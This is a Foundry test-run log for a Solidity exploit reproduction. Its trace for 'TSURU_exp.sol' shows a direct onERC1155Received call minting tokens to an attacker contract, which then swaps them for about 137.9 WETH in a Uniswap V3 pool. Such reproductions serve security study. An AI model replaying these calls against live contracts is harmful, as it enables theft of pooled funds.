Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.24s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20453)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20453] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 277.12ms (217.90µs CPU time)

Ran 1 test for src/test/2024-05/TSURU_exp.sol:TsuruExploit
[PASS] testExploit() (gas: 192320)
Logs:
  Attacker WETH Balance Before exploit: 0.000000000000000000
  Attacker WETH Balance After exploit: 137.904209005799603676

Traces:
  [215020] TsuruExploit::testExploit()
    ├─ [3058] 0x4200000000000000000000000000000000000006::symbol() [staticcall]
    │   └─ ← [Return] "WETH"
    ├─ [2457] 0x4200000000000000000000000000000000000006::balanceOf(TsuruExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [2336] 0x4200000000000000000000000000000000000006::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Attacker WETH Balance Before exploit", val: 0, decimals: 18)
    ├─ [64796] 0x75Ac62EA5D058A7F88f0C3a5F8f73195277c93dA::onERC1155Received(0x0000000000000000000000000000000000000000, TsuruExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 418, 0x)
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: TsuruExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 167200000000000000000000000 [1.672e26])
    │   └─ ← [Return] 0xf23a6e6100000000000000000000000000000000000000000000000000000000
    ├─ [918] 0x75Ac62EA5D058A7F88f0C3a5F8f73195277c93dA::balanceOf(TsuruExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 167200000000000000000000000 [1.672e26]
    ├─ [0] VM::assertEq(167200000000000000000000000 [1.672e26], 167200000000000000000000000 [1.672e26], "Not enough tokens") [staticcall]
    │   └─ ← [Return] 
    ├─ [86652] 0x913b1658dd001dFF93D3AF2A657523F1eed53917::swap(TsuruExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], false, 167200000000000000000000000 [1.672e26], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x)
    │   ├─ [27701] 0x4200000000000000000000000000000000000006::transfer(TsuruExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 137904209005799603676 [1.379e20])
    │   │   ├─ emit Transfer(from: 0x913b1658dd001dFF93D3AF2A657523F1eed53917, to: TsuruExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 137904209005799603676 [1.379e20])
    │   │   └─ ← [Return] true
    │   ├─ [2918] 0x75Ac62EA5D058A7F88f0C3a5F8f73195277c93dA::balanceOf(0x913b1658dd001dFF93D3AF2A657523F1eed53917) [staticcall]
    │   │   └─ ← [Return] 70030241191671388549126771 [7.003e25]
    │   ├─ [8936] TsuruExploit::uniswapV3SwapCallback(-137904209005799603676 [-1.379e20], 167200000000000000000000000 [1.672e26], 0x)
    │   │   ├─ [266] 0x913b1658dd001dFF93D3AF2A657523F1eed53917::token0() [staticcall]
    │   │   │   └─ ← [Return] 0x4200000000000000000000000000000000000006
    │   │   ├─ [6717] 0x75Ac62EA5D058A7F88f0C3a5F8f73195277c93dA::transfer(0x913b1658dd001dFF93D3AF2A657523F1eed53917, 167200000000000000000000000 [1.672e26])
    │   │   │   ├─ emit Transfer(from: TsuruExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x913b1658dd001dFF93D3AF2A657523F1eed53917, value: 167200000000000000000000000 [1.672e26])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   ├─ [918] 0x75Ac62EA5D058A7F88f0C3a5F8f73195277c93dA::balanceOf(0x913b1658dd001dFF93D3AF2A657523F1eed53917) [staticcall]
    │   │   └─ ← [Return] 237230241191671388549126771 [2.372e26]
    │   ├─ emit Swap(param0: TsuruExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: TsuruExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: -137904209005799603676 [-1.379e20], param3: 167200000000000000000000000 [1.672e26], param4: 160232557491823020370621061776802 [1.602e32], param5: 117004329353403876218891 [1.17e23], param6: 152248 [1.522e5])
    │   └─ ← [Return] -137904209005799603676 [-1.379e20], 167200000000000000000000000 [1.672e26]
    ├─ [457] 0x4200000000000000000000000000000000000006::balanceOf(TsuruExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 137904209005799603676 [1.379e20]
    ├─ [0] VM::assertEq(137904209005799603676 [1.379e20], 137904209005799603676 [1.379e20], "Not enough ETH") [staticcall]
    │   └─ ← [Return] 
    ├─ [1058] 0x4200000000000000000000000000000000000006::symbol() [staticcall]
    │   └─ ← [Return] "WETH"
    ├─ [457] 0x4200000000000000000000000000000000000006::balanceOf(TsuruExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 137904209005799603676 [1.379e20]
    ├─ [336] 0x4200000000000000000000000000000000000006::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Attacker WETH Balance After exploit", val: 137904209005799603676 [1.379e20], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.60s (1.99s CPU time)

Ran 2 test suites in 2.60s (2.87s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
